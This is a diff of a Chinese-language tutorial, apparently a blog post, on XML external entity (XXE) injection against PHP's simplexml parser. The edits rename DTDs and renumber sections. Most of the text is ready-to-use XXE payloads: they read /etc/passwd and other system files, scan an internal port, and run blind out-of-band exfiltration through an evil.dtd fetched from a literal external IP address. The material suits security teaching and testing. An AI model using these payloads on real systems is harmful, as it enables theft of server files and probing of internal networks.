@@ -23,12 +23,15 @@ $xml = simplexml_load_string($data);
 echo $xml->name;
 ```
 
-### 0x02 读取文件
+### 0x02 判断是否有xxe漏洞
+![95](/img/post/20180906-110942.png)
+
+### 0x03 读取文件
 * 外部引用读取passwd
 
 ```
 <?xml version="1.0" encoding="utf-8"?> 
-<!DOCTYPE xdsec [
+<!DOCTYPE xxe [
   <!ELEMENT name ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
@@ -39,7 +42,7 @@ echo $xml->name;
 
 ```
 <?xml version="1.0" encoding="utf-8"?> 
-<!DOCTYPE xdsec [
+<!DOCTYPE xxe [
   <!ELEMENT name ANY >
   <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
 ]>
@@ -53,7 +56,7 @@ echo $xml->name;
 evil.dtd中的内容为：```<!ENTITY b SYSTEM "file:///etc/passwd">```
 ```
 <?xml version="1.0" encoding="utf-8"?> 
-<!DOCTYPE xdsec [
+<!DOCTYPE xxe [
   <!ELEMENT name ANY >
   <!ENTITY % xxe SYSTEM "http://114.115.183.86/evil.dtd">
   %xxe;
@@ -63,10 +66,10 @@ evil.dtd中的内容为：```<!ENTITY b SYSTEM "file:///etc/passwd">```
 </root>
 ```
 
-### 0x03 端口探测
+### 0x04 端口探测
 ```
 <?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE xdsec [
+<!DOCTYPE xxe [
   <!ENTITY http SYSTEM 'http://10.11.11.20:3306/'>
 ]>
 <root>
@@ -74,12 +77,12 @@ evil.dtd中的内容为：```<!ENTITY b SYSTEM "file:///etc/passwd">```
 </root>
 ```
 
-### 0x04 Blind-XXE
+### 0x05 Blind-XXE
 * 方法一：
 
 ```
 <?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE xdsec [
+<!DOCTYPE xxe [
     <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/issue">
     <!ENTITY % remote SYSTEM "http://114.115.183.86/wyb/evil.dtd">
     %remote;
@@ -98,7 +101,7 @@ evil.dtd内容：
 
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE xdsec [
+<!DOCTYPE xxe [
     <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hosts">
     <!ENTITY % remote SYSTEM "http://114.115.183.86/wyb/evil.xml">
     %remote;   <!--引用remote来将外部文件evil.xml引入到解释上下文中-->
